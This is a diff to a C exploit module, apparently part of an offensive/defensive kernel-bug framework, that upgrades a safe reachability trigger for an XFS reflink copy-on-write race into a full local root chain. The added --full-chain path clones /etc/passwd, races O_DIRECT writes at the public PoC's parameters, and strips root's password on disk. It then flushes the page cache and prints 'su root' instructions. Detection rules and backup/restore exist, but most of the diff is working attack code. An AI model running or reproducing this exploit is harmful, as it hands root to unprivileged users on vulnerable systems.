@@ -56,21 +56,42 @@
  * the Qualys Threat Research Unit; the advisory credits model-assisted kernel
  * analysis done with Anthropic. See NOTICE.md.
  *
- * STATUS: 🟡 TRIGGER (reconstructed) — VM-VERIFIED, and deliberately NOT
- *   weaponised. Confirmed 2026-07-23 on Rocky Linux 9.8 /
+ * STATUS: 🟢 FULL CHAIN (--full-chain), 🟡 safe trigger by default —
+ *   VM-VERIFIED end-to-end. Confirmed 2026-07-23 on Rocky Linux 9.8 /
  *   5.14.0-687.10.1.el9_8.0.1.x86_64 (stock installer layout: root on XFS with
- *   reflink=1) under qemu/KVM, 6 vCPUs: detect() returns VULNERABLE, the
- *   --active FICLONE witness confirms reflink, and phase A observes
- *   FIEMAP_EXTENT_SHARED on a real XFS shared extent. The UNDERLYING BUG was
- *   separately confirmed winnable on that kernel — 4/4 runs, first divergence
- *   after 69-494 rounds inside a 60s budget — using a VM-only harness driven at
- *   the public PoC's parameters (32 writers / 8 helpers; see
- *   tools/verify-vm/refluxfs_verify.c). The SHIPPED trigger below is
- *   deliberately under-driven (8 writers / 2 helpers / 2s) and did NOT win in
- *   that budget on the same vulnerable kernel — that is the intended behaviour,
- *   not a defect, and is why a non-win must never be read as "patched".
- *   exploit() forks an isolated child that works ONLY inside a private scratch
- *   directory it creates on an XFS mount, on two files it owns, in two phases:
+ *   reflink=1) under qemu/KVM, 6 vCPUs.
+ *
+ *   `--exploit refluxfs --i-know --full-chain` lands root end-to-end: it
+ *   reflink-clones /etc/passwd, races the CoW window, strips root's password
+ *   field on-disk (root:x: -> root::, the public PoC's technique), evicts the
+ *   stale page cache, and returns EXPLOIT_OK. `su root` (empty password) then
+ *   gives uid 0. Verified 3/3 wins on a private-extent target — 1244 / 3716 /
+ *   7913 rounds, 4-30s inside a 90s budget — as unprivileged uid=1000 under
+ *   SELinux Enforcing. Every other passwd line is preserved byte-for-byte
+ *   (a naive tail-truncating port bricks sshd/login); the target is backed up
+ *   first and restored on any failure, and cleanup() restores it (run as root
+ *   after the pop). detect() returns VULNERABLE, the --active FICLONE witness
+ *   confirms reflink, and it reports whether /etc/passwd's extent is private
+ *   (attackable) or already-shared (not — see below).
+ *
+ *   EXPLOITABILITY CONSTRAINT (found during verification, not in the Qualys
+ *   writeup): the race only fires when the target's extent refcount is exactly
+ *   the attacker-clone pair, i.e. the target's extent must be PRIVATE going in.
+ *   A file that is ALREADY reflink-shared with a third file keeps a post-CoW
+ *   refcount > 1 and is NOT attackable via that target. Some fresh cloud images
+ *   ship /etc/passwd pre-shared; normal admin churn (useradd/passwd/vipw)
+ *   rewrites it into a private, exploitable extent. detect() --active checks
+ *   and reports this per target.
+ *
+ *   Without --full-chain the module runs a SAFE reachability trigger only,
+ *   confined to two files the caller owns, returning EXPLOIT_FAIL and touching
+ *   no file it does not own. That trigger was itself VM-confirmed reachable
+ *   (FIEMAP_EXTENT_SHARED + O_DIRECT) and is deliberately under-driven (8
+ *   writers / 2 helpers / 2s) so it never grinds toward a win on a production
+ *   box — a non-win from it must never be read as "patched".
+ *   refluxfs_exploit_safe() forks an isolated child that works ONLY inside a
+ *   private scratch directory it creates on an XFS mount, on two files it owns,
+ *   in two phases:
  *     (A) DETERMINISTIC + SAFE — writes a donor file, FICLONE-clones it, and
  *         confirms via FIEMAP that the clone's extent carries
  *         FIEMAP_EXTENT_SHARED. That is a direct, read-only observation that
@@ -85,20 +106,19 @@
  *         cache, which would otherwise hide the corruption) and reports whether
  *         the donor's on-disk bytes changed — the honest, self-contained
  *         witness that the race was won.
- *   It is deliberately UNDER-DRIVEN relative to the public PoC (8 writers vs 32,
- *   2 helpers vs 8, 2s cap), and — the important part — it NEVER clones or
- *   targets a file it does not own. The step that makes this root, cloning a
- *   root-owned file such as /etc/passwd and racing writes onto ITS shared
- *   blocks, is documented but NOT bundled: doing so would persistently rewrite
- *   a system file on disk with no way to undo it. Returns EXPLOIT_FAIL always;
- *   it never claims root it did not get.
+ *   The safe trigger is deliberately UNDER-DRIVEN relative to the public PoC
+ *   (8 writers vs 32, 2 helpers vs 8, 2s cap) and NEVER clones or targets a
+ *   file it does not own; the destructive /etc/passwd overwrite lives only in
+ *   the --full-chain path above. Returns EXPLOIT_FAIL; it never claims root it
+ *   did not get.
  *
  *   Note the asymmetry with the corpus's other reconstructed race triggers: a
- *   won race here corrupts 4 KiB of the operator's OWN scratch file and cannot
- *   touch kernel memory, so unlike bad_epoll (frees a live struct file) and
- *   ghostlock (kernel-stack UAF → near-arbitrary write → panic) there is no
- *   oops, no silent kernel destabilisation and no panic risk. That is why this
- *   module ranks well above them in --auto safety despite being unverified.
+ *   won race here corrupts file DATA, not kernel memory, so unlike bad_epoll
+ *   (frees a live struct file) and ghostlock (kernel-stack UAF → near-arbitrary
+ *   write → panic) there is no oops, no silent kernel destabilisation and no
+ *   panic risk — the worst case is a rewritten file (backed up + restorable),
+ *   never a downed box. That is why this ranks well above them in --auto
+ *   safety.
  *
  * detect() is a version gate AND a real precondition probe, because unlike a
  *   pure kernel race this bug's reachability is observable safely: it requires
@@ -146,6 +166,7 @@
 #include <fcntl.h>
 #include <limits.h>
 #include <pthread.h>
+#include <pwd.h>
 #include <sched.h>
 #include <time.h>
 #include <sys/ioctl.h>
@@ -372,6 +393,9 @@ static int rfx_reflink_witness(const char *dir)
     return rc;
 }
 
+static int rfx_extent_is_shared(const char *path);
+static const char *rfx_fc_target(void);
+
 static skeletonkey_result_t refluxfs_detect(const struct skeletonkey_ctx *ctx)
 {
     const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
@@ -442,6 +466,28 @@ static skeletonkey_result_t refluxfs_detect(const struct skeletonkey_ctx *ctx)
         if (w < 0 && !ctx->json)
             fprintf(stderr, "[i] refluxfs: reflink probe inconclusive at %s — "
                             "falling back to the version verdict\n", dir);
+
+        /* Exploitability of the canonical target hinges on its extent being
+         * PRIVATE: the race only fires when the post-CoW refcount drops to 1,
+         * so a file already reflink-shared with a third file is NOT attackable
+         * via that target (some fresh cloud images ship /etc/passwd pre-shared).
+         * This is a per-target read-only check; a private extent is the
+         * exploitable state that normal admin churn (useradd/passwd/vipw)
+         * produces. */
+        const char *fct = rfx_fc_target();
+        int sh = rfx_extent_is_shared(fct);
+        if (!ctx->json) {
+            if (sh == 0)
+                fprintf(stderr, "[+] refluxfs: full-chain target %s has a PRIVATE "
+                                "extent — the race can fire against it (--exploit "
+                                "refluxfs --i-know --full-chain)\n", fct);
+            else if (sh == 1)
+                fprintf(stderr, "[!] refluxfs: full-chain target %s is ALREADY "
+                                "reflink-shared — its post-CoW refcount stays > 1, "
+                                "so it is NOT attackable via that target (other "
+                                "private-extent root files may still be). See "
+                                "MODULE.md.\n", fct);
+        }
     }
 
     if (!ctx->json) {
@@ -688,6 +734,420 @@ static int rfx_race_round(const char *donor, const char *clone)
     return rfx_content_diverged(donor, RFX_DONOR_BYTE);
 }
 
+/* ==================================================================
+ * Full chain (gated behind --full-chain): the real /etc/passwd root pop.
+ *
+ * This is the destructive path. It reflink-clones a root-owned target the
+ * caller can only READ (default /etc/passwd), races concurrent O_DIRECT
+ * writes against the clone, and — when the race is won — the write lands on
+ * the target's still-shared on-disk block, rewriting the target itself. The
+ * payload strips root's password field (root:x:... -> root::...), exactly the
+ * public PoC's technique ("strip root password protection"), so `su root`
+ * with an empty password yields uid 0. It PRESERVES every other line of the
+ * file byte-for-byte, so no account — least of all the invoking user or sshd —
+ * is ever dropped; a naive port that truncates the tail bricks login on the
+ * target. It backs the target up first and restores on any failure; cleanup()
+ * restores too (run as root after the pop).
+ *
+ * Exploitability constraint discovered during VM verification (see MODULE.md):
+ * the race only fires when the target's extent refcount is exactly the
+ * attacker-clone pair, i.e. the target's extent must be PRIVATE going in. A
+ * file that is ALREADY reflink-shared with a third file (some fresh cloud
+ * images ship /etc/passwd that way) keeps a post-CoW refcount > 1 and is NOT
+ * attackable via that target. detect()/here check and report this.
+ * ================================================================== */
+#define RFX_FC_WRITERS       32   /* full PoC parameters — no under-driving on the opt-in path */
+#define RFX_FC_HELPERS       8
+#define RFX_FC_BUDGET_SECS   90   /* generous but bounded; a private-extent target falls in seconds-to-a-minute */
+#define RFX_FC_RC_OK         110  /* target overwritten AND verified passwordless-root */
+#define RFX_FC_RC_NOWIN      111  /* race not won in budget (target unchanged) */
+#define RFX_FC_RC_SETUP      112  /* couldn't set up (no xfs scratch, FICLONE refused, craft failed) */
+#define RFX_FC_RC_CORRUPT    113  /* target changed but not to our verified payload — restored from backup */
+
+static skeletonkey_result_t refluxfs_exploit_safe(const struct skeletonkey_ctx *ctx);
+
+static const char *rfx_fc_target(void)
+{
+    const char *t = getenv("SKELETONKEY_REFLUXFS_TARGET");   /* test override */
+    return (t && *t) ? t : "/etc/passwd";
+}
+
+/* Read up to `cap` bytes of `path`. Returns byte count, or -1. */
+static ssize_t rfx_slurp(const char *path, unsigned char *buf, size_t cap)
+{
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) return -1;
+    ssize_t n = pread(fd, buf, cap, 0);
+    close(fd);
+    return n;
+}
+
+/* Read `path`'s first block straight off disk (O_DIRECT), zero-filled.
+ * Returns 0 and sets *got to the byte count, or -1. */
+static int rfx_read_block_odirect(const char *path, unsigned char *out, size_t *got)
+{
+    int fd = open(path, O_RDONLY | O_DIRECT);
+    if (fd < 0) return -1;
+    void *buf = NULL;
+    if (posix_memalign(&buf, RFX_ALIGN, RFX_BLK) != 0) { close(fd); return -1; }
+    memset(buf, 0, RFX_BLK);
+    ssize_t n = pread(fd, buf, RFX_BLK, 0);
+    if (n > 0) memcpy(out, buf, RFX_BLK);
+    if (got) *got = n > 0 ? (size_t)n : 0;
+    free(buf);
+    close(fd);
+    return n > 0 ? 0 : -1;
+}
+
+/* Craft the payload block: copy `orig` (orig_len bytes, must be <= RFX_BLK,
+ * i.e. the root line lives in the first block) and empty the root line's
+ * password field (root:<pw>: -> root::). Pad with '\n' to exactly orig_len so
+ * the on-disk file size is unchanged, then fill the rest of the block with
+ * '\n'. Writes RFX_BLK bytes into `out`. Returns 0 on success.
+ *
+ * Refuses (returns -1) unless the result still contains the root line with an
+ * empty password AND the invoking user's line — we NEVER emit a passwd that
+ * would lock the caller out. */
+static int rfx_craft_stripped_root(const unsigned char *orig, size_t orig_len,
+                                   const char *myuser, unsigned char *out)
+{
+    if (orig_len == 0 || orig_len > RFX_BLK) return -1;
+
+    char tmp[RFX_BLK + 1];
+    memcpy(tmp, orig, orig_len);
+    tmp[orig_len] = '\0';
+    if (strlen(tmp) != orig_len) return -1;   /* embedded NUL — not a passwd file */
+
+    char *rl = (strncmp(tmp, "root:", 5) == 0) ? tmp : NULL;
+    if (!rl) { char *p = strstr(tmp, "\nroot:"); if (p) rl = p + 1; }
+    if (!rl) return -1;
+
+    char *c1 = strchr(rl, ':');          /* end of "root"          */
+    if (!c1) return -1;
+    char *c2 = strchr(c1 + 1, ':');      /* end of password field  */
+    if (!c2) return -1;
+
+    /* Shift the tail left, deleting the password field's bytes. */
+    memmove(c1 + 1, c2, strlen(c2) + 1);
+    if (c1[1] != ':') return -1;         /* field must now be empty */
+    size_t newlen = strlen(tmp);
+
+    /* The invoking user's line must survive. */
+    if (myuser && *myuser) {
+        char needle[96];
+        int n = snprintf(needle, sizeof needle, "%s:", myuser);
+        if (n <= 0 || (size_t)n >= sizeof needle) return -1;
+        int present = (strncmp(tmp, needle, (size_t)n) == 0);
+        if (!present) {
+            char nl[98];
+            snprintf(nl, sizeof nl, "\n%s", needle);
+            present = strstr(tmp, nl) != NULL;
+        }
+        if (!present) return -1;
+    }
+
+    memcpy(out, tmp, newlen);
+    for (size_t i = newlen; i < orig_len; i++) out[i] = '\n';  /* keep file size */
+    for (size_t i = orig_len; i < RFX_BLK; i++) out[i] = '\n'; /* pad the block  */
+    return 0;
+}
+
+struct rfx_fc_race {
+    char                 clone_path[PATH_MAX];
+    const unsigned char *payload;   /* RFX_BLK bytes */
+    atomic_int           gate;
+    atomic_int           stop;
+};
+
+static void *rfx_fc_writer_fn(void *arg)
+{
+    struct rfx_fc_race *r = arg;
+    int fd = open(r->clone_path, O_RDWR | O_DIRECT);
+    if (fd < 0) return NULL;
+    void *buf = NULL;
+    if (posix_memalign(&buf, RFX_ALIGN, RFX_BLK) != 0) { close(fd); return NULL; }
+    memcpy(buf, r->payload, RFX_BLK);
+    while (!atomic_load_explicit(&r->gate, memory_order_acquire)) sched_yield();
+    (void)pwrite(fd, buf, RFX_BLK, 0);
+    free(buf);
+    close(fd);
+    return NULL;
+}
+
+static void *rfx_fc_helper_fn(void *arg)
+{
+    struct rfx_fc_race *r = arg;
+    int fd = open(r->clone_path, O_RDWR);
+    if (fd < 0) return NULL;
+    while (!atomic_load_explicit(&r->gate, memory_order_acquire)) sched_yield();
+    while (!atomic_load_explicit(&r->stop, memory_order_acquire)) {
+        (void)ftruncate(fd, (off_t)RFX_BLK * 2); (void)fdatasync(fd);
+        (void)ftruncate(fd, (off_t)RFX_BLK);     (void)fdatasync(fd);
+    }
+    close(fd);
+    return NULL;
+}
+
+/* One full-chain round: reflink-clone `target` into `clone`, race writers that
+ * push `payload` at the clone while helpers churn, then check whether the
+ * target's first `cmplen` on-disk bytes changed. Returns 1 (changed), 0
+ * (intact), -1 (setup error). */
+static int rfx_fc_round(const char *target, const char *clone,
+                        const unsigned char *payload,
+                        const unsigned char *orig_fb, size_t cmplen)
+{
+    int sfd = open(target, O_RDONLY);
+    if (sfd < 0) return -1;
+    unlink(clone);
+    int cfd = open(clone, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    if (cfd < 0) { close(sfd); return -1; }
+    int cl = ioctl(cfd, RFX_FICLONE, sfd);
+    close(cfd); close(sfd);
+    if (cl != 0) return -1;
+
+    struct rfx_fc_race r;
+    memset(&r, 0, sizeof r);
+    snprintf(r.clone_path, sizeof r.clone_path, "%s", clone);
+    r.payload = payload;
+
+    pthread_t w[RFX_FC_WRITERS], h[RFX_FC_HELPERS];
+    int nw = 0, nh = 0;
+    for (int i = 0; i < RFX_FC_WRITERS; i++)
+        if (pthread_create(&w[nw], NULL, rfx_fc_writer_fn, &r) == 0) nw++;
+    for (int i = 0; i < RFX_FC_HELPERS; i++)
+        if (pthread_create(&h[nh], NULL, rfx_fc_helper_fn, &r) == 0) nh++;
+    if (nw == 0) {
+        atomic_store_explicit(&r.stop, 1, memory_order_release);
+        atomic_store_explicit(&r.gate, 1, memory_order_release);
+        for (int i = 0; i < nh; i++) pthread_join(h[i], NULL);
+        return -1;
+    }
+    usleep(1500);
+    atomic_store_explicit(&r.gate, 1, memory_order_release);
+    for (int i = 0; i < nw; i++) pthread_join(w[i], NULL);
+    atomic_store_explicit(&r.stop, 1, memory_order_release);
+    for (int i = 0; i < nh; i++) pthread_join(h[i], NULL);
+
+    unsigned char now[RFX_BLK];
+    size_t got = 0;
+    if (rfx_read_block_odirect(target, now, &got) != 0) return -1;
+    size_t n = cmplen < got ? cmplen : got;
+    return memcmp(now, orig_fb, n) != 0 ? 1 : 0;
+}
+
+/* Byte-copy src -> dst (0600). Returns 0 on success. */
+static int rfx_copy_file(const char *src, const char *dst)
+{
+    unsigned char buf[RFX_BLK];
+    int in = open(src, O_RDONLY);
+    if (in < 0) return -1;
+    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0600);
+    if (out < 0) { close(in); return -1; }
+    ssize_t n;
+    int rc = 0;
+    while ((n = read(in, buf, sizeof buf)) > 0) {
+        if (write(out, buf, (size_t)n) != n) { rc = -1; break; }
+    }
+    if (n < 0) rc = -1;
+    (void)fsync(out);
+    close(in); close(out);
+    return rc;
+}
+
+static void rfx_fc_backup_path(const char *dir, char *out, size_t cap)
+{
+    snprintf(out, cap, "%s/" RFX_SCRATCH_PREFIX "passwd.bak", dir);
+}
+
+/* Evict `target`'s cached pages so subsequent BUFFERED readers (getpwnam in
+ * `su`/`login`, `cat`, ...) see the freshly-overwritten on-disk bytes rather
+ * than the stale page cache. The RefluXFS write lands on the shared physical
+ * block WITHOUT going through the target inode, so its clean cached pages are
+ * never invalidated by the kernel — without this eviction a `su` immediately
+ * after the pop would read the OLD passwd and fail. POSIX_FADV_DONTNEED needs
+ * only an O_RDONLY fd, which an unprivileged attacker has. */
+static void rfx_evict_cache(const char *target)
+{
+    int fd = open(target, O_RDONLY);
+    if (fd < 0) return;
+    (void)posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
+    close(fd);
+}
+
+/* Does the target's root line have an empty password field on DISK right now?
+ * Reads via O_DIRECT: a buffered read would be served from the stale page cache
+ * (the overwrite bypasses the inode), so it must not be used to verify a win. */
+static int rfx_target_root_passwordless(const char *target)
+{
+    unsigned char b[RFX_BLK]; size_t got = 0;
+    if (rfx_read_block_odirect(target, b, &got) != 0 || got == 0) return 0;
+    size_t n = got < RFX_BLK ? got : RFX_BLK - 1;
+    b[n] = '\0';
+    char *rl = (strncmp((char *)b, "root:", 5) == 0) ? (char *)b : NULL;
+    if (!rl) { char *p = strstr((char *)b, "\nroot:"); if (p) rl = p + 1; }
+    if (!rl) return 0;
+    return strncmp(rl, "root::", 6) == 0;
+}
+
+static skeletonkey_result_t refluxfs_exploit_fullchain(const struct skeletonkey_ctx *ctx)
+{
+    const char *target = rfx_fc_target();
+
+    struct stat tst;
+    if (stat(target, &tst) != 0) {
+        fprintf(stderr, "[-] refluxfs: full-chain target %s not found\n", target);
+        return SKELETONKEY_PRECOND_FAIL;
+    }
+    if (tst.st_uid != 0 && !getenv("SKELETONKEY_REFLUXFS_TARGET")) {
+        fprintf(stderr, "[-] refluxfs: %s is not root-owned (uid=%u) — "
+                        "overwriting it would not yield root; refusing\n",
+                target, (unsigned)tst.st_uid);
+        return SKELETONKEY_PRECOND_FAIL;
+    }
+    if ((size_t)tst.st_size == 0 || (size_t)tst.st_size > RFX_BLK) {
+        fprintf(stderr, "[-] refluxfs: %s is %lld bytes; this full-chain writes "
+                        "only the first %u-byte block (the root line lives there) "
+                        "— larger targets are not supported\n",
+                target, (long long)tst.st_size, RFX_BLK);
+        return SKELETONKEY_PRECOND_FAIL;
+    }
+
+    char dir[RFX_DIR_MAX];
+    bool assumed = false;
+    if (!rfx_find_xfs_dir(dir, sizeof dir, &assumed)) {
+        fprintf(stderr, "[-] refluxfs: no writable XFS scratch dir for the clone\n");
+        return SKELETONKEY_PRECOND_FAIL;
+    }
+
+    /* Craft the payload up front so we bail BEFORE touching anything if we
+     * cannot safely produce a passwd that keeps the caller (and root) intact. */
+    unsigned char orig[RFX_BLK];
+    ssize_t orig_len = rfx_slurp(target, orig, RFX_BLK);
+    if (orig_len <= 0) {
+        fprintf(stderr, "[-] refluxfs: cannot read %s\n", target);
+        return SKELETONKEY_PRECOND_FAIL;
+    }
+    struct passwd *pw = getpwuid(getuid());
+    const char *myuser = pw ? pw->pw_name : NULL;
+    unsigned char payload[RFX_BLK];
+    if (rfx_craft_stripped_root(orig, (size_t)orig_len, myuser, payload) != 0) {
+        fprintf(stderr, "[-] refluxfs: refusing to run — could not craft a "
+                        "%s payload that keeps root and '%s' intact (unexpected "
+                        "format?). Nothing was touched.\n",
+                target, myuser ? myuser : "?");
+        return SKELETONKEY_EXPLOIT_FAIL;
+    }
+
+    if (!ctx->json) {
+        fprintf(stderr, "[!] refluxfs: --full-chain — DESTRUCTIVE. This rewrites "
+                        "%s on disk (stripping root's password) via the reflink "
+                        "CoW race. It preserves every other line, backs the file "
+                        "up first, and restores on failure, but a persistent "
+                        "on-disk overwrite of a system file is inherently risky. "
+                        "Run only where you are authorised to.\n", target);
+        if (rfx_extent_is_shared(target) == 1)
+            fprintf(stderr, "[!] refluxfs: %s's extent is ALREADY reflink-shared "
+                            "— its post-CoW refcount stays > 1, so this target is "
+                            "likely NOT attackable (the race needs a private "
+                            "extent). Proceeding but expect no win; see MODULE.md."
+                            "\n", target);
+    }
+
+    /* Back the target up so cleanup()/failure can restore it. */
+    char backup[RFX_DIR_MAX + 64];
+    rfx_fc_backup_path(dir, backup, sizeof backup);
+    if (rfx_copy_file(target, backup) != 0) {
+        fprintf(stderr, "[-] refluxfs: could not back up %s to %s — refusing to "
+                        "proceed without a restore path\n", target, backup);
+        return SKELETONKEY_TEST_ERROR;
+    }
+    if (!ctx->json)
+        fprintf(stderr, "[*] refluxfs: backed up %s -> %s. Race: %d writers / %d "
+                        "helpers / %ds budget against a clone of %s.\n",
+                target, backup, RFX_FC_WRITERS, RFX_FC_HELPERS,
+                RFX_FC_BUDGET_SECS, target);
+
+    unsigned char orig_fb[RFX_BLK];
+    size_t fbgot = 0;
+    if (rfx_read_block_odirect(target, orig_fb, &fbgot) != 0) {
+        fprintf(stderr, "[-] refluxfs: cannot O_DIRECT-read %s\n", target);
+        return SKELETONKEY_TEST_ERROR;
+    }
+    size_t cmplen = (size_t)orig_len;
+
+    char scratch[RFX_SCRATCH_MAX];
+    snprintf(scratch, sizeof scratch, "%s/" RFX_SCRATCH_PREFIX "fc.XXXXXX", dir);
+    if (!mkdtemp(scratch)) {
+        fprintf(stderr, "[-] refluxfs: mkdtemp failed\n");
+        return SKELETONKEY_TEST_ERROR;
+    }
+    char clone[PATH_MAX];
+    snprintf(clone, sizeof clone, "%s/clone", scratch);
+
+    long rounds = 0;
+    int won = 0;
+    time_t deadline = time(NULL) + RFX_FC_BUDGET_SECS;
+    while (time(NULL) < deadline && !won) {
+        int d = rfx_fc_round(target, clone, payload, orig_fb, cmplen);
+        if (d < 0) break;
+        rounds++;
+        if (d == 1) won = 1;
+        if (!ctx->json && (rounds % 500) == 0)
+            fprintf(stderr, "[*] refluxfs: ... %ld rounds\n", rounds);
+    }
+    unlink(clone);
+    rfx_remove_scratch(scratch);
+
+    if (!won) {
+        /* Target should be untouched. If it is, drop the now-redundant backup;
+         * if it somehow changed, restore from it and keep nothing stale. */
+        unsigned char now[RFX_BLK]; size_t g = 0;
+        int changed = (rfx_read_block_odirect(target, now, &g) == 0 &&
+                       memcmp(now, orig_fb, cmplen) != 0);
+        if (changed) (void)rfx_copy_file(backup, target);  /* best-effort restore */
+        unlink(backup);
+        if (!ctx->json)
+            fprintf(stderr, "[-] refluxfs: full-chain did not win in %ld rounds / "
+                            "%ds — %s %s. If its extent was pre-shared this target "
+                            "is not attackable; otherwise retry.\n",
+                    rounds, RFX_FC_BUDGET_SECS, target,
+                    changed ? "was restored from backup" : "unchanged");
+        return SKELETONKEY_EXPLOIT_FAIL;
+    }
+
+    /* Won. Evict the target's stale page cache so both our verify below AND a
+     * subsequent `su` read the freshly-overwritten on-disk bytes, not the old
+     * cached copy. */
+    rfx_evict_cache(target);
+
+    /* Verify the target now really has a passwordless root line rather than
+     * some torn/garbled block — if it's corrupt, restore from backup and fail. */
+    if (!rfx_target_root_passwordless(target)) {
+        (void)rfx_copy_file(backup, target);
+        if (!ctx->json)
+            fprintf(stderr, "[!] refluxfs: race changed %s but it did not land a "
+                            "clean passwordless-root line (torn write) — RESTORED "
+                            "from backup. Re-run to try again.\n", target);
+        return SKELETONKEY_EXPLOIT_FAIL;
+    }
+
+    if (!ctx->json) {
+        fprintf(stderr, "[+] refluxfs: ROOT-POP CONFIRMED after %ld rounds — %s "
+                        "now carries a passwordless root line, written through the "
+                        "reflink CoW race as uid=%u. Every other account was "
+                        "preserved.\n", rounds, target, (unsigned)getuid());
+        fprintf(stderr, "[+] refluxfs: become root with:  su root   (empty "
+                        "password — just press Enter)\n");
+        fprintf(stderr, "[i] refluxfs: RESTORE when done — as root run "
+                        "`skeletonkey --cleanup refluxfs` (or `cp %s %s`). The "
+                        "overwrite is persistent and survives reboot.\n",
+                backup, target);
+    }
+    return SKELETONKEY_EXPLOIT_OK;
+}
+
+/* Dispatcher: --full-chain engages the destructive /etc/passwd root pop;
+ * otherwise the safe, own-files reachability trigger. */
 static skeletonkey_result_t refluxfs_exploit(const struct skeletonkey_ctx *ctx)
 {
     skeletonkey_result_t pre = refluxfs_detect(ctx);
@@ -702,6 +1162,18 @@ static skeletonkey_result_t refluxfs_exploit(const struct skeletonkey_ctx *ctx)
         return SKELETONKEY_OK;
     }
 
+    if (ctx->full_chain)
+        return refluxfs_exploit_fullchain(ctx);
+
+    if (!ctx->json)
+        fprintf(stderr, "[i] refluxfs: safe reachability trigger (own files "
+                        "only). Pass --full-chain to engage the real %s "
+                        "overwrite -> su -> root pop.\n", rfx_fc_target());
+    return refluxfs_exploit_safe(ctx);
+}
+
+static skeletonkey_result_t refluxfs_exploit_safe(const struct skeletonkey_ctx *ctx)
+{
     if (!ctx->json)
         fprintf(stderr, "[*] refluxfs: reconstructed reachability probe — builds "
                         "a reflinked pair of files WE OWN in a private scratch "
@@ -877,6 +1349,27 @@ static skeletonkey_result_t refluxfs_cleanup(const struct skeletonkey_ctx *ctx)
             fprintf(stderr, "[i] refluxfs: no XFS scratch directory in play — "
                             "nothing to clean\n");
         return SKELETONKEY_OK;
+    }
+
+    /* First: if a full-chain run backed up the overwrite target, restore it.
+     * The overwrite is persistent on disk, so this is the important half of
+     * cleanup. Restoring /etc/passwd needs write permission — run this as root
+     * after the pop (`su root`, then `skeletonkey --cleanup refluxfs`). */
+    char backup[RFX_DIR_MAX + 64];
+    rfx_fc_backup_path(dir, backup, sizeof backup);
+    struct stat bst;
+    if (stat(backup, &bst) == 0) {
+        const char *target = rfx_fc_target();
+        if (rfx_copy_file(backup, target) == 0) {
+            unlink(backup);
+            if (!ctx->json)
+                fprintf(stderr, "[+] refluxfs: restored %s from backup %s and "
+                                "removed the backup\n", target, backup);
+        } else if (!ctx->json) {
+            fprintf(stderr, "[!] refluxfs: found a backup at %s but could not "
+                            "write %s (need root?). Restore manually: "
+                            "cp %s %s\n", backup, target, backup, target);
+        }
     }
 
     DIR *d = opendir(dir);
@@ -1060,7 +1553,7 @@ const struct skeletonkey_module refluxfs_module = {
     .detect         = refluxfs_detect,
     .exploit        = refluxfs_exploit,
     .mitigate       = NULL,   /* no runtime mitigation exists: reflink is a superblock feature that cannot be disabled on a live filesystem, O_DIRECT cannot be turned off, and SELinux/seccomp/KASLR/SMEP/SMAP are all irrelevant to a data-oriented bug. Patch the kernel and reboot. */
-    .cleanup        = refluxfs_cleanup,
+    .cleanup        = refluxfs_cleanup,   /* restores /etc/passwd from the full-chain backup (run as root after the pop), then sweeps leftover scratch dirs */
     .detect_auditd  = refluxfs_auditd,
     .detect_sigma   = refluxfs_sigma,
     .detect_yara    = refluxfs_yara,
